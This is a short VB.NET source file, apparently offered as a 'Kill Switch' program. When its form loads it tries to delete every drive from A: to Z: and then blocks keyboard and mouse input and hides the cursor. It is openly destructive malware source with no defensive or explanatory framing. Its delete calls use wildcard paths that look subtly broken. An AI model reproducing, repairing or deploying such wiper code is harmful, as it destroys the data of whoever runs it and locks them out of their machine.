Imports System.IO

Public Class mainForm

    ' Created By: Bailey D
    ' Kill Switch (VB.NET) - No Dependency's

    ' API Declarations
    Declare Function BlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Declare Function ShowCursor Lib "user32" (ByVal lShow As Long) As Long

    Private Sub mainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' Deletes every drive on the system
        Directory.Delete("A:\\*.*")
        Directory.Delete("B:\\*.*")
        Directory.Delete("C:\\*.*")
        Directory.Delete("D:\\*.*")
        Directory.Delete("E:\\*.*")
        Directory.Delete("F:\\*.*")
        Directory.Delete("G:\\*.*")
        Directory.Delete("H:\\*.*")
        Directory.Delete("I:\\*.*")
        Directory.Delete("J:\\*.*")
        Directory.Delete("K:\\*.*")
        Directory.Delete("L:\\*.*")
        Directory.Delete("M:\\*.*")
        Directory.Delete("N:\\*.*")
        Directory.Delete("O:\\*.*")
        Directory.Delete("P:\\*.*")
        Directory.Delete("Q:\\*.*")
        Directory.Delete("R:\\*.*")
        Directory.Delete("S:\\*.*")
        Directory.Delete("T:\\*.*")
        Directory.Delete("U:\\*.*")
        Directory.Delete("V:\\*.*")
        Directory.Delete("W:\\*.*")
        Directory.Delete("X:\\*.*")
        Directory.Delete("Y:\\*.*")
        Directory.Delete("Z:\\*.*")

        ' Disabiling Keyboard & Mouse Input
        BlockInput(1)
        ShowCursor(0)

    End Sub

End Class
